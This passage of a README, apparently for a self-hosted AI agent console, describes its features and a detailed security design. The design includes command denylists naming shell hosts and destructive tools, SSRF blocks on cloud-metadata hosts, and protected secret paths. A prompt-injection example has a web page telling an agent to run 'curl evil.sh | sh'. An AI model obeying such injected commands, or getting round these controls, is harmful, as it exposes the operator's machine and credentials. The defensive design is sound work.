Draw the flow instead of describing it.

**Nodes** — agent, parallel, merge, checkpoint, delay, loop, end.

![Routing chart — three workflows with loops and fan-out](screenshots/routing-three-workfows.png)

**Loops** carry per-lap state, and **parallel fan-out** runs every ready node concurrently — the scheduler handles it.

![A loop feeding a parallel group](screenshots/routeing-loop.png)

**Checkpoints** pause the run for review before it continues downstream.

![A checkpoint waiting for review](screenshots/checkpoint.png)

**Delays** wait a duration or until a wall-clock time, and hold only their own branch.

**Live run state** shows on the edges (marching + glow while running, settle when done), with a faint **ghost transcript** of the chat behind the canvas and an **align-to-grid** snap (off by default). A **notification bell** lists run errors/warnings.

---

## 🧠 Brain Lab

![Brain Lab](screenshots/Brain-Lab.png)

One rail for everything about the selected agent:

<details>
<summary>The full rail, locks, and the Config tidy-up</summary>

- **Identity** — name, label, role, provider, model, colour, active.
- **Prompts & Profiles** — the agent's system prompt, an always-append box, and reusable **direction profiles** you can attach and lock. (A fleet-wide override lives in the Agents-tab header — see *Global pre-prompt override*.)
- **Direction profiles** — reusable, lockable instructions you can **attach** and **append** to any agent, so a house style is defined once and shared.
- **Rate / Throttle** — per-agent pacing.
- **Approvals & Tools** — per-tool **allow / ask / deny**, plus a tool protocol picker that shows the **auto-detected** dialect.
- **Custom tools** — define your own, straight from the rail.
- **Sandbox** — a per-agent **file jail** and the file manager.
- **Memory** — private and collective notes, a Long-term-memory switch, and delete buttons (forgetting is a first-class action).
- **Always-On** — a standing goal, loop cadence, and a live RUNNING/HELD/IDLE badge. (Full walk-through in *Always-On — the loop that runs itself* below.)

Every setting has a 🔒 **lock**: unlocked agents follow the global value live; a lock pins the agent to its own value so a global change never moves it. 🔏

---

**What these controls are for.** A file jail per agent, per-tool allow / ask / deny, and an `exec`
you must switch on: everything dangerous ships off, every write asks first, and the refusals are
proven by tests that make the real request - `serve.php`, the shipped `.htaccess` and the nginx
regexes all run through `php tests/php/run.php`. Turn the jail off, point it at a filesystem root and
auto-approve writes, and you have a capable tool with no brakes. The defaults are deliberately the
opposite, and the locks exist so one agent cannot quietly change them.

Apache-2.0, no warranty. The guards reduce risk; they do not make an agent safe to point at anything
you cannot afford to lose.


</details>

---
## 🧪 API Lab

![API Lab](screenshots/API-Lab.png)

Opened from the 🧪 icon in the Agents-tab header.

<details>
<summary>Both directions, server-side sending and guardrails</summary>

- **Both directions**: `curl → request → 10 languages`, and `language → request → curl/bash/Python/TypeScript/OpenAI-SDK`.
- **Sending is server-side**, because the browser can't reach most providers (no CORS headers). The server runs the request and returns the status + body.
- **Guardrails**: http/https only; cloud-metadata addresses refused; key-shaped headers masked on screen (copy/send still use the real value); response bodies truncated.

</details>

---

## 🌐 Built-in browser — you watch, the agents drive

![The built-in browser: live page, address bar, click-through and the drive-it rail](screenshots/Browser.png)

A **real Chrome or Edge**, right inside the console — 🚫 no packages, 🚫 no extensions, just the DevTools Protocol. 🖥️ Open it from the **Browser** item in the apps notch and you get the live page, an address bar, **Go / Reload**, a **Live** auto-refresh, a headless ⇄ window toggle, and a **click-through** view: tap the page and it clicks. ✨

<details>
<summary>Click, type and read, logins, gates and the block list</summary>

- 🖱️ **Click, type, read** — click anywhere on the screenshot, type into the field you need, press **Enter**, and pull the page's visible text.
- 🤖 **Agents use the same page** — `browser_open` / `browser_click` / `browser_type` / `browser_read` / `browser_wait` drive it too, so a model can genuinely operate a web app. `browser_open` shows a visible window by default; pass `"headless":true` only when nobody needs to watch.
- 🔐 **Logins stick** — the profile is persistent: log in **once** (headless, or in a window you can take over 🫳) and both you and the agents reuse the session.
- 🛡️ **Off by default and gated** — Config → Labs → *Browser* switches it on; **http/https only**, cloud-metadata addresses refused, and every route is token-gated.
- 🚫 **A domain / URL / IP block list** — a right-rail box on the Browser screen. One pattern per line, `*` wildcard: `*.gov`, `*word*`, a bare host/IP (`10.0.0.1`), or a URL path (`site.com/a/b/`). Enforced **server-side on every navigation** — yours *and* the agents' — and **re-checked after a click or type** in case a link reaches a banned host.
- 🐕 **One browser, reaped** — launching (or stopping) reaps any stray headless Chrome/Edge still holding the profile dir, so orphan instances never pile up and chew CPU/GPU.
- ⚡ **No multi-second stalls** — DevTools HTTP is read by exact `Content-Length` over a raw socket, navigation returns the moment the page is interactive, and every action is single-flight so a slow page can't stampede the connection pool.

</details>

---

## 🔐 Security & guardrails — safe by construction 🛡️

> **The short version:** giving a language model a shell, a filesystem and the web
> is normally a terrifying idea. So this app assumes the model is *hostile*, the
> web content it reads is *booby-trapped*, and the only trustworthy actor is
> **you, the operator**. Every capability is **off until you switch it on**, every
> dangerous action **asks first**, and every escape hatch has a floor beneath it.
> Nothing ships with a key 🔑, nothing runs before a token 🔑, and no tool can
> reach past the fence you drew. 🧱

### 🔑 1. The front door is locked — a per-device access token
- **🚪 Every single API route is gated.** With a token set, a request without it gets `401`; a copy with `require_token` on but no token at all answers `503 {"error":"no token configured"}`; and with `require_token` off, a caller that is not on this machine gets `403 local requests only` (§21). The only thing standing between a stranger and your agents' conversations, your files and your shell; the app has **no user accounts**, on purpose.
- **🧬 Nothing ships with a token.** A fresh copy **refuses to serve anything** until you run `./setup-token.sh` (or the one-click installer does it for you) — the `503` above is what anyone gets until then. You literally cannot forget to set one.
- **📵 The token never roams.** It is a **device-local credential**, *stripped from every state bundle* before it is mirrored to the server or synced to another device. One browser's empty field can never wipe another device's working paste.
- **🔁 Rotate on demand** — `./setup-token.sh --force` mints a new one; the old value dies instantly.
- **🧷 A restore cannot hand the gate away.** RESTORE keeps **this copy's own** access token, gate and roots even when the file came from an installation with a different token — so restoring someone else's backup can neither lock you out of your copy nor open it with theirs.
- **🔎 Lost it? `./setup-token.sh --show` prints the one in use** and says whether the gate is on or off. It
  needs python **or** php — whichever answers, php being the one a running copy cannot be without — and on
  Windows `start.bat -Token` prints the same token with no interpreter at all.

### 🚦 2. Approvals — nothing scary happens without a nod
- **✋ Ask-first by default.** `write_file`, `exec`, `run_code`, `git_commit` and their friends **queue a prompt** you answer: **Allow once / Always / Deny**.
- **🟢 Auto-approve is opt-in** — an explicit switch you flip, never an inherited default. Turn it on and any agent may write files without asking; leave it off and a human stays in the loop.
- **🛑 Auto-deny — the panic button.** One switch refuses *everything* that would otherwise ask, instantly, everywhere.
- **📥 A single Pending-approvals queue** collects everything waiting (from every agent **and** every remote MCP friend) so nothing slips through unseen.

### 🧾 3. Allow / Deny lists — an argv-level bouncer

![The Allow / Deny panel: per-interpreter levels, the editable denylist, and Restore built-in defaults](screenshots/deny-interpreters-fixed.png)
- **✅ An allowlist you own** decides which programs may run at all. Each command is matched **argument by argument** — no glob fuzz.
- **⛔ A denylist that wins over approvals.** It is checked *before* the allowlist and before the approval prompt, so a name on it can never be waved through with "Always allow". `reboot`, `shutdown`, `rm`, `sudo`, `cmd`, `powershell` and the classic foot-guns live here.
- **🔁 …but nothing is denied *forever*.** The list is a **default**, not a law: an explicit `sandbox.exec_deny` in `storage/config.json` **replaces it wholesale**, and the same list is editable inline under **Config → Shell access** (or an MCP card's *Permissions* tab). Remove a name and it becomes an ordinary command again — refused as *"not allowed"* and back in the approval queue, exactly like everything else. No program is refused by name anywhere in code.
- **↩️ The undo path is on screen, not in the docs.** A refusal names the exact place to fix it — *"delete the `explorer` line under **Config → Permissions → Shell access → Allow / Deny** (section 4), add it to section 2"* — and says why an approval can't do it (the denylist is checked first). In that panel, **Restore built-in defaults** reloads the shipped list even after a custom one replaced it, so you can always see what you replaced. An empty box falls back to the built-in defaults on purpose: clearing it must not silently un-deny `rm` and `sudo`. For a genuinely empty denylist, set `"exec_deny": []` in `storage/config.json` — which is what the panel's hint tells you.
- **🧨 Tripwires for metacharacters** — `|`, `&&`, `eval`, `xargs`, `env` and friends are refused, so a model can't smuggle a second command through a "harmless" one.
- **🎚️ Per-interpreter levels** — Blocked / Scripts only / Full — so `run_code` can be dialled from "no" to "quiet scripts" to "go wild" independently of `exec`.
- **🚀 Background commands pass the same bouncer.** `exec_start` goes through the allowlist, the denylist and the approval prompt exactly as `exec` does — a server or watcher is not a way around the gate — and `exec_kill` stops the handle it was given. Inline-code flags stay refused for known interpreters even when merely allowlisted, and the path guard covers unlisted commands too.

### 🧱 4. The jail — a fence with no back gate
- **🔒 Every path is resolved server-side.** `../`, `..\\`, absolute paths and **symlinks** are all resolved and then checked — anything outside your declared **read/write roots** is refused with a message the model can read, not a mysterious crash.
- **🙈 Protected paths — secrets are invisible even *inside* a root.** A default deny-list (`storage/`, `.git`, `.env*`, `*.pem`, `*.key`, dotfiles, …) is enforced in the resolver itself, so **even if you point the root at the whole app folder, the access token and every provider key still cannot be read.** Clear the list to opt out — nothing is permanent.
- **✂️ Write scope is separate from read scope.** Keep writes in a scratch folder and even a prompt-injected agent can't overwrite `Config.php`, `.htaccess` or session data.

### 🐚 5. No shell to hijack
- **🧩 `exec` takes an *argv array*, not a string.** There is **no `sh -c`, no pipes, no redirects, no `$(...)`** — so there is no second command to inject, ever. The dangerous parts of "running a command" simply don't exist here.
- **📂 A directory argument is opaque to the path guard.** The check reads the *arguments*, so `cat storage/config.json` is refused — but `grep -rn token .` names only `.`, and grep itself decides what lies underneath. The protect list covers this app’s own tools (`read_file`, `grep`, `glob`, `zip`, `copy`, `move`, `remove`) and any argument that names a protected path; it cannot see inside a program that opens the directory itself. **A known recursive reader — `grep`, `rg`, `git grep`, `find`, `du`, `tar`, `zip` and the like — is refused outright** when the directory it was handed contains a protected entry — the guard knows the scope even though it cannot see what the program does inside it, so `grep -rn token .` over a tree holding `storage/` is turned away with the entry named. `git grep` has no path when it means the whole checkout, so its cwd is checked the same way. The scan is bounded (2,000 entries): a tree **too large to finish checking is refused too**, rather than waved through. Filesystem permissions remain the backstop — run the server as a user that cannot read `storage/`, and set an access token so the API is not leaning on locality either. A policy that cannot see inside `grep` should not be described as if it could.
- **🪟/🐧 Windows-aware** — builtins are implemented in PHP where no `.exe` exists, `.cmd`/`.bat` shims are never shelled, and the prompt is told the truth about the host so it stops guessing.
- **🔤 One entry covers both spellings.** Policy comparisons fold case and ignore a trailing `.exe`/`.com`, so `exec_allow: [grep]` matches the `grep.exe` Git for Windows actually ships, and a deny entry for `bash` also stops `bash.exe` (the WSL launcher). Without this the lists only protected the spelling you happened to type.
- **🪟 The Windows command hosts are denied by default.** `cmd`, `powershell`, `pwsh`, `wscript`, `cscript`, `mshta`, `rundll32`, `regsvr32`, `msiexec`, `wmic`, `schtasks`, `sc`, `reg`, `regedit` and `explorer` are each the local spelling of `sh -c` — the payload rides inside an argument, so the allowlist, the path guard and the jail never see it. They are **defaults you can remove**, not permanent refusals: that is the difference between a policy and a hardcoded block.

### 🧬 6. Edits are atomic, or they don't happen
- **🧷 `apply_patch` (V4A) and `multi_edit` are all-or-nothing.** Every hunk must match its context **exactly once**; one miss and **nothing is written** — no half-applied file, no corrupted source.
- **👀 Read-before-write** is the taught workflow, and search/replace refuses an ambiguous match rather than guessing which one you meant.

### 🐙 7. Git runs on a leash
- **📜 A subcommand allowlist** — read-only commands (`status`, `diff`, `log`, `show`, `blame`) run freely; anything that **writes** (`add`, `commit`, `checkout`, …) **asks first**.
- **🚫 Retargeting flags refused** — `-c`, `--git-dir`, `--work-tree`, `--output` can't be used to point git at somewhere it shouldn't go. `git_commit` supplies a safe default identity so it works on a clean host.

### 🌐 8. Network egress is fenced (SSRF guardrails)
- **🛰️ `fetch_url` and `http_request` refuse private and cloud-metadata hosts** by name — `169.254.x.x`, `metadata.google.internal`, `100.100.100.200` and friends — so a model can't use your box to probe the internal network or steal cloud credentials.
- **🔒 `http/https` only.** Spoofed `Host`, `Content-Length` and `Accept-Encoding` headers are **stripped**; responses are **truncated** so a giant page can't exhaust memory.
- **🧪 The API Lab keeps the same rules** and names the layer it failed at (dns / tls / connect / timeout / blocked) instead of leaking a stack trace.
- **🔒 The certificate is checked, not assumed.** Every outbound model and speech call used to carry `CURLOPT_SSL_VERIFYPEER => false`, so any host that answered was trusted with the API key and the prompt — a café network, a shared VPS neighbour or a proxy from a free list could stand in for the provider. Verification is on now: **Auto** (default) verifies real providers and exempts loopback, private ranges, `.local`/`.lan`/`.internal` names and single-word host names so a self-signed local runner still works; **Always verify** covers those too; **Never verify** is an explicit choice saved in `storage/config.json` under `tls.verify`, and the panel spells out what it means. Plain `http://` endpoints are untouched — there is no certificate in that exchange to check.
- **📌 A pin is a fingerprint, not a checkbox.** Trusting a LAN host means reading the chain it presents, seeing the SHA-256, and confirming it: `storage/tls/trusted.pem`, listed in Config → TLS / Certificates with its expiry, removable with FORGET (the last removal deletes the file, because an empty CAINFO fails every call while a missing one simply means nothing is pinned). `tls.ca_bundle` can still point at a PEM you manage yourself; an explicit bundle wins over pins and the panel says when it does. Nothing is ever written outside `storage/tls/`, and a certificate close to expiry is named in the TLS panel and in the bell before it becomes an outage.

### 🕵️ 9. Secrets never appear on screen
- **🙈 Key-shaped headers (`Authorization`, `x-api-key`, `Cookie`, …) are masked in the UI** — display only. Copy and send still use the real value, and the server **never echoes request headers back**.
- **📚 The converter lesson, learned the hard way.** Saved browser pages faithfully preserve secrets. The app now keeps such dumps **out of the webroot**, and the guidance is plain: **strip keys before saving a page.**

### 🖼️ 10. Vision is safe by construction
- **🧨 An image that is *also* a script** is the classic polyglot attack. Only **PNG / JPEG / WebP / GIF** are accepted, and only after they sniff as **inert**.
- **☁️ The bytes never touch the server.** An attached image becomes an in-memory `data:` URL and rides in the request's `image_url` field — **no upload endpoint, no file on disk.** 🗑️

### 🌐 11. The built-in browser is gated on every hop
- **🚪 Off by default**; every browser route returns **403** until you enable it (and the API refuses the tools regardless of what a prompt says).
- **🔗 `http/https` only**, cloud-metadata refused, and a **server-side block list** (`*.gov`, `*word*`, bare hosts/IPs, URL paths) is enforced on **every navigation** — yours *and* the agents' — and **re-checked after a click or type** in case a link reaches a banned host.
- **🐕 One instance, reaped.** Launching reaps any stray headless Chrome/Edge still holding the profile dir, so there is never a pile of them chewing CPU/GPU.

### 🤝 12. MCP server — lending tools without giving away the house
- **🎫 Per-friend tokens, each with a scope** — **read** / **write** / **exec** — plus an optional **IP allowlist** and **one-click revoke**. Tokens never expire until you kill them.
- **📏 Scope is a *ceiling*, the Sandbox is the *floor*.** A friend's token only decides *which* tool it may reach; the call still runs through **every** control above — the file jail, allow/deny lists, interpreter levels, code gate and the approval queue.
- **⏳ An un-allowed command lands in *your* Pending-approvals list** and the friend's call simply returns *"waiting for the operator."*
- **🏚️ Friends work in a scratch folder** that gets a **deny-all `.htaccess`**, so what they write is never served over the web.
- **🧾 Every call is audited** to `storage/mcp.log` (now JSON, so the graph can replay it).

### 🧷 13. Prompt-injection posture
- **Abandon all trust, ye who `fetch` here.** Anything an agent *reads* is treated as hostile input — which is exactly why commands are allowlisted, executed without a shell, and every path is jailed. A web page that says *"run `curl evil.sh | sh`"* hits three walls before it does anything: the allowlist, the no-shell exec, and the deny list.
- **🛠️ Tool calls win the argument.** The tool instructions state plainly that a tool call is the **one exception** to any "reply with only text / N words" rule, and the loop **re-prompts once** if a model merely *narrates* a tool call instead of sending it.
- **🚧 Agents can *call* MCP servers — never add one.** Server connections are operator-only.

### 🚫 14. Everything dangerous defaults to OFF 🐢
| Capability | Default | Guardrail |
| --- | --- | --- |
| 🔑 Access token | **required** | `401` without it — nothing runs first-run |
| 🐚 `exec` (shell) | **off** | allowlist + absolute deny + no shell |
| 🐍 `run_code` | **off** | per-interpreter level (Blocked / Scripts / Full) |
| 🌐 Built-in browser | **off** | `403`, http/https only, block list, SSRF guard |
| 🔁 API pool | **on** | only engages for a provider that *has* pool keys — with none, `pickKey` returns null and the single provider key is used exactly as before |
| 🖥️ MCP server | **off** | per-friend scoped tokens, audit log |
| 🟢 Auto-approve | **off** | every write still asks |
| 🕶️ Run while tab hidden | **off** | a background loop can't bill you silently |
| 🧮 Resource Manager | **all off** | the graph renders exactly as before |

### 🧯 15. Fails closed, and tells the truth
- **🧱 Fail closed** — when in doubt, refuse. A refused path reads as *"outside the allowed directories"*, never a blank `500`.
- **🧹 Error hygiene** — failures come back as `{"error": "..."}` with HTTP `400` and a message **meant for the model**, and `display_errors` stays off so stack traces and filesystem paths never leak to a browser.
- **🔍 Observability for you** — a live **Run trace** and an MCP audit log mean every model turn and tool call is inspectable after the fact.

### 🗄️ 16. `storage/` is never web-served — in **every** serving mode

- **🔑 What it holds.** The access token, every provider API key, the state
  bundle, **every session transcript**, and the **exec allow/deny lists** that
  decide which shell commands an agent may run. It is the most sensitive folder
  in the app, and the one-folder design puts it *inside* the web root — so the
  refusal has to be part of the app, not a step you remember. 🧠
- **🧭 Same policy everywhere.** `storage/` is not special-cased: `storage`, `logs`,
  `tmp`, `sessions` and `tests` are refused as **path segments**, in **all four**
  serving modes, and the dev tooling is treated exactly like the secrets.

| What is requested | 🧪 `serve.php` | 🟡 Apache | 🔴 nginx | 🔵 IIS |
| --- | --- | --- | --- | --- |
| `storage/config.json`, `state.json`, sessions | **403** | **403** | **404** | **404** |
| `tests/php/…`, `tests/js/…` | **403** | **403** | **404** | **404** |
| The bare folders (`/storage`, `/tests/`) — no listing either | **403** | **403** | **404** | **404** |
| **Any depth**: `<copy>/storage/config.json`, `<copy>/tests/…` | **403** | **403** | **404** | **404** |
| `…/STORAGE/state.json` (case variant) | **403** | **403** | **404** | **404** |
| Dotfiles at **any depth** (`.git/…`, `.htaccess`, `.env`, `.htpasswd`) | **403** | **403** | **404** | deny ¹ |
| Loose `.json` `.log` `.ini` `.bak` `.key` `.pem` outside `storage/` | served ² | served ² | **404** | served ² |
| `/api`, `/api/sessions`, `/api/config` | **served** | **served** | **served** | **served** |
| `ui/js/storage.js`, `ui/js/tools.js`, `/testsuite/` | **served** | **served** | **served** | **served** |

<sub>¹ IIS has no `.htaccess` equivalent: its refusal has to come from a `web.config` you add (the snippet is under *Quick start → Deploying*), the way nginx's comes from `nginx.example.conf`. Apache's own `.ht*` default is **not** a substitute — it covers `.htaccess` and `.htpasswd` and serves `.git/config` quite happily — which is why the root `.htaccess` carries the same dot rule as the other two modes. ² These only exist if something wrote them there — `storage/` never is.</sub>

- **🪆 Why “any depth” matters.** A second copy of the app — a backup, an
  archive of an older version, a folder kept for comparison — brings its **own**
  `storage/` with the same token and keys in it, and its `tests/` may predate
  `tests/.htaccess`. A root-only check served all of that. The guard is therefore a
  **segment** rule, not a prefix rule: anything named `storage` anywhere in the path
  is refused, which is why `https://host/router/old-copy/storage/config.json`
  answers `403` instead of a token.
- **🗂️ The checkout sits in the web root, so `.git/` is part of the surface.**
  This folder is the repository *and* the thing being served, which puts `.git/`
  behind the same door as everything else: `.git/config` can carry a remote URL
  with a token in it, and `.git/objects` reconstructs **every file ever
  committed** — including one removed later for holding a secret. `serve.php` and
  `nginx.example.conf` always refused dotfiles; Apache did not, and served
  `.git/config` with the real `[core]` section as a **200**. The root
  `.htaccess` now refuses any path segment starting with a dot, at any depth,
  with `/.well-known` as the single exception so ACME renewal still works — and
  `apacheGuards.test.php` requests `.git/config`, `.git/HEAD`, `.git/objects/pack/`
  and a nested `.git` so it cannot quietly reopen.
- **🧠 Why Apache needs `RedirectMatch`, not just a `RewriteRule`.** In
  per-directory context a child `.htaccess` **replaces** its parent's rewrite rules
  unless it opts into `RewriteOptions Inherit` — and every copy of this app ships
  its own root `.htaccess`, so a rewrite in the outer app never sees
  `<copy>/tests/…`. mod_alias configuration *is* merged down the tree, so the
  shipped `RedirectMatch 403` holds no matter what a nested folder declares. (Found
  with an Apache `rewrite:trace3` log: once the request maps into the copy, the
  parent's rules are skipped entirely.)
- **🚫 API routes are exempt — deliberately.** They are **endpoints, not files**.
  The sidebar asks for `/api/sessions` to list sessions; a rule that matched the
  word refused that call and broke the UI. No API route maps onto a path on disk —
  the handlers open `storage/` themselves, server-side.
- **🎯 Segment-anchored, not substring.** `ui/js/storage.js`, `ui/js/tools.js` and `/testsuite/` are still served: only a folder actually named `tests` is refused.
- **🔠 Case-insensitive on purpose.** Windows and macOS disks resolve
  `/STORAGE/state.json` to the real file, so a case-sensitive check was not a
  check at all — `serve.php` lower-cases every segment, Apache uses `NC` / `(?i)`,
  and nginx uses `~*`.
- **🧾 No source either.** `serve.php` refuses any `.php` request except the API
  front controller, so a mistyped path can't print PHP source as text; nginx is
  told to deny dotfiles and loose data files (`.json`, `.log`, `.ini`, `.bak`,
  `.key`, `.pem`) even outside `storage/`.
- **🟡 Apache files that ship and self-repair.** `storage/.htaccess` refuses its
  whole folder with `Require all denied` (plus an Apache 2.2 `Order/Deny` fallback,
  so an old host gets a clean `403` rather than a `500`), `tests/.htaccess` does
  the same for the dev tooling, and `./setup-token.sh` **re-creates the storage one
  if a deploy lost it**.
- **🚨 Verify, don't trust.** After deploying, ask for both — in a private window:
  ```bash
  curl -s -o /dev/null -w '%{http_code}\n' https://your-host/router/storage/config.json   # want 403 / 404
  curl -s -o /dev/null -w '%{http_code}\n' https://your-host/router/tests/js/run.mjs       # want 403 / 404
  curl -s -o /dev/null -w '%{http_code}\n' https://your-host/router/api/sessions           # want 401, never 403
  ```
  JSON or source in the first two means the folder is exposed — stop and fix the
  rule before anything else. 🛑
- **🏰 The strongest option:** keep `storage/` **outside** the document root. If
  the one-folder design forces it inside, the deny rules above are mandatory, not
  optional.

### 🧪 17. The guards are proven, not assumed

A guard nobody requests is a guard you don't have, so each serving mode has a test
that **makes the real request** and fails loudly when a path comes back:

| Test | What it actually does |
| --- | --- |
| 🧪 `guards.test.php` | Boots `serve.php` on a loopback port and requests the live paths — files, bare folders, case variants, dotfiles, the `/api/*` exemption and lookalike names |
| 🟡 `apacheGuards.test.php` | Boots the local Apache with this folder as `DocumentRoot` and `AllowOverride All`, so the **shipped `.htaccess` files themselves** are what answer — `/tests`, `/storage`, the archived copy, and the dotfile rule over `.git/config`, `.git/HEAD`, `.git/objects/` and a nested `.git` |
| 🔴 `nginxGuards.test.php` | Lifts the `location` regexes out of `nginx.example.conf` and runs them through PCRE — the engine nginx matches with — so a rule that reopens a hole fails without nginx installed |
| 🪆 nested-copy checks | `guards.test.php` requests nested paths directly; `apacheGuards.test.php` does the same against the archived copy when one is present — the case a root-anchored rule misses |

Run them with the rest of the suite (*Tests*, below). 🌱

- 🚫 `tests/php/recursiveRead.test.php` — runs the real exec path guard against a temporary tree that holds `storage/`: `grep -r` and `du` over the root are refused and the entry is named, the same command narrowed to a clean subdirectory runs, and `cat` on an ordinary file is untouched.
- ✂️ `tests/js/directCall.test.mjs` — drives the real `Chat._callAgentCore` with streaming off and only `api.callProvider` stubbed, so a body cut off at the token ceiling produces the truncation sentence (model name and the **Config → Limits & Budgets** pointer included) instead of "the provider returned an empty response".

### 🌐 18. Closed by default in the browser, too

- 🚫 **No CORS wildcard — deliberately.** The API used to answer with
  `Access-Control-Allow-Origin: *`, which let **any** website on the internet
  `fetch()` this server and read the answers: every conversation, the memory and
  the whole config. The UI is served from this same origin and never needed it.
  Cross-origin is now refused unless the origin is explicitly listed in
  `ROUTER_CORS_ORIGINS` (comma-separated), and `Vary: Origin` keeps caches honest.
- 🛡️ **Security headers on every Apache response** — `X-Content-Type-Options:
  nosniff` (a `.js` can’t be talked into being a script of another type),
  `X-Frame-Options: DENY` (the console can’t be framed inside another site, so no
  clickjacking a SAVE button) and `X-XSS-Protection: 1; mode=block`. The built-in
  server adds `nosniff` to everything it serves, SPA fallback included.
- 🧊 **Cache policy is part of the contract** — HTML is `no-store`; JS and CSS are
  `no-cache, must-revalidate`, so a browser can never pair a new module with a
  month-old one (which is how an old `api.js` once ran beside a new `tools.js`).
  The UI you audited is the UI that loads. ✅
- 🔑 **The token never rides along** — it is stripped from every state bundle
  before that bundle is mirrored to the server or synced to another device (§1).
- 🙈 **What a *read* hands back is masked, and a copy with no token answers this machine only.** Both are
  measures in their own right, with their own accounts below: **[§20 🔐 masked reads](#-20-secrets--masked-going-out-restored-coming-back)**
  and **[§21 🏠 local-only](#-21-no-token-set--this-machine-only)**.

> ⚖️ **The honest caveat:** the app is only as safe as the operator's switches. Turn
> everything on, auto-approve writes, and point the root at `/` — and you have built
> yourself a very capable foot-gun. The design *makes the safe choice the default*
> and *makes the unsafe choice deliberate*, but it does not (and cannot) read your
> mind. Keep the root narrow, keep approvals on, and rotate your keys. 💙

### 🖥️ 19. Opening programs — a name, never a command line

An agent can open a **real desktop program** on the machine this app runs on (**Config → Permissions →
Shell access → Programs**). It could not do this usefully before: through `exec` a window was force-closed at the command
timeout while the whole turn waited on it.

- 🏷️ **The operator's list is the whole allowlist.** An agent may only **name** a program from
  `sandbox.programs`; the path and the arguments come from that config. No string a model writes ever
  reaches the OS launcher, so its quoting, `&`, `;` and `%` have nowhere to land — the same reason `exec`
  takes argv instead of a command line.
- 🪟 **Detached, so the window outlives the reply** — `cmd /c start` on Windows (the mechanism the built-in
  browser already opens Chrome/Edge with), a backgrounded process on POSIX. There is no timeout here to
  close what you asked to open.
- 🧾 **Audited as a start with no end.** A launch writes one `kind=program phase=start` line and no end
  line, which is what **Config → TRACE → EXEC** reads back as *started, never finished* — the case that
  format exists for.
- 🚫 **`.bat`, `.cmd` and `.ps1` are refused** as launch targets, because starting one means handing back the
  command shell or script host this whole design keeps away from a model. That refusal is by extension and
  is deliberately not overridable from the list; `exec_interpreters` is the door for script files, where the
  script is jailed to the allowed directories and inline code is still refused.
- 🙋 **Approval is the approval you already have** — *Ask / Allow / Deny* for **Opening programs** and
  **Closing programs**, plus Auto Approve, Auto Deny and the usual prompt.
- 🎯 **A close finds the *binary*, never the name.** Processes are matched by the file they are running from
  (`/proc/<pid>/exe` on Linux, one `Get-CimInstance Win32_Process` query on Windows, `ps` elsewhere) and
  compared as resolved paths. The older `tasklist` image-name filter made any other copy of that file on the
  machine into *"the same program"*, so a close could end something you never opened — a vendor's
  `helper.exe`, a second editor. If a host will not give up a process list, `close` **refuses** rather than
  falling back to the name.
- 🚪 **Closing is graceful first** (`taskkill /PID` posts WM_CLOSE; POSIX sends TERM), so a program can still
  ask about unsaved work; `force` ends the process outright. The reply names the pids it ended, and every one
  that refused with the reason (`access denied`, `already exited`) — `ok` means the program is gone, not that
  a signal was sent. A console program with no window has nothing to receive a close request, so it needs
  force.
- ⌨️ **Typing is a tool too — `window_type`, and it is really typing.** An agent with an open window can send
  keystrokes into it, live on screen: `window_open` Notepad, `window_type` the words, watch them appear. The
  program must already be running (typing into nothing throws instead of pretending), the window is brought
  forward and the keys sent in one motion, and each call carries at most 2000 characters — a long letter goes
  in several bursts, which is also what it looks like. Special keys arrive literally (`+`, `%` and friends are
  escaped, newlines become ENTER), the keystrokes are *never* written to the trace (it records that typing
  happened, not what was typed), and approval is its own switch — **Typing into programs** beside Opening and
  Closing. After the send it reads the program's own text control back through Windows UI Automation, so the
  result says whether the text really landed — the Frontier drill requires that read-back, not just a call with
  the right arguments. Windows only: it is the system's own keystroke injector, and POSIX has no single
  equivalent, so anywhere else refuses plainly. And the old rule still holds — the operator names the program,
  the model only supplies the keys.
- 📦 **A Store copy is still the same program.** On Windows 11 a program like Notepad *runs* from a
  WindowsApps path nobody configured, while the list holds the alias stub that launched it — so the match
  crosses that one boundary by file name, and only there, because neither side is a place a second copy
  could be hiding. `window_type` also waits a few seconds for a just-opened program to show up before
  concluding nothing is running, and checks the window really came forward before sending — a stolen focus
  fails loudly instead of typing into the wrong place.
- 🧾 **The trace is written by this app alone** — every field is stripped of control characters before it
  reaches `storage/exec.log`, so an argument carrying a newline cannot append a record of a command that
  never ran. Full account in **[§22](#-22-the-trace-is-written-by-this-app-alone)**.
- ⚠️ **Where the window appears matters.** A program opens in the session Apache runs in: started as a
  console process (`start.bat`) it appears on your desktop, but installed as a Windows **service** it lands
  in session 0 and nothing is ever visible. On POSIX it needs a desktop session — a headless host has nowhere
  to draw. The card states which of these is true on this host, so nobody guesses.
- 🔒 **Off by default** (`sandbox.programs_enabled`, empty list): updating an older install gains the tools
  and no capability at all until you add a program.

### 🔐 20. Secrets — masked going out, restored coming back

Three routes were handing back the very values they exist to protect. 🚨 It is worth being precise about why
that is worse than it sounds, because it is not "a leak of one secret" — **it is the same secret that guards
the other doors.**

- 🎯 **What came back, verbatim** — `GET /api/config` returned the **access token**, a **proxy URL with its
  password in it**, and every **provider API key**; `GET /api/mcp/servers` returned each MCP client's
  `headers` (the `Authorization: Bearer …`, and any other key header); `GET /api/mcp-server/config` returned
  every **friend's token**. The access token is what the front gate compares against, and a friend token is
  what `McpServer::authenticate()` compares against — so one read disclosed the keys to every gated route.
  🗝️➡️🚪
- 🙈 **What comes back now: `********`.** A single constant (`Config::SECRET_MASK`) and two functions —
  `Config::maskSecrets()` on the way out, `Config::restoreSecrets()` on the way in — so the mask is spelled
  once and cannot drift between routes. Masked: the access token, `sandbox.proxy_active` **when it carries
  credentials**, every value in an MCP client's `headers`, the MCP server's tokens, and its protected-paths
  entries that hold secrets. ✂️
- 🕳️ **Empty stays empty — the difference matters.** *"No token configured"* and *"a token you are not
  allowed to see"* are two different states, and the UI has to tell them apart: a fresh install must show an
  empty field (and the *run `setup-token.sh`* hint), not eight asterisks. So masking is applied **only to
  values that are actually set**. 🫥 A proxy with **no** username and password is not a secret either — it is
  a setting, and the panel still names the exit node you are routing through. 🌐
- ♻️ **Why masking cannot simply mean "never send it":** every panel in this app edits by **read → change
  one key → post the whole config back**. Hand a page a config with a blanked token and the very next toggle
  writes the blank back to disk — a wiped credential that shows up later as a server answering `401`, with
  nothing in the logs to say why. So the read masks and the **write restores.** 🔁
- 🧬 **Restore matches by *identity*, not by position.** An array index is not a name: reordering two MCP
  servers, or deleting one and adding another, would have put a stranger's header onto the wrong server (a
  live credential pointed at an endpoint you never configured). Matching is therefore: a **server by its
  `id`, then by its URL, then by its command line**; a **friend token by its id, then by its label**. Rename a
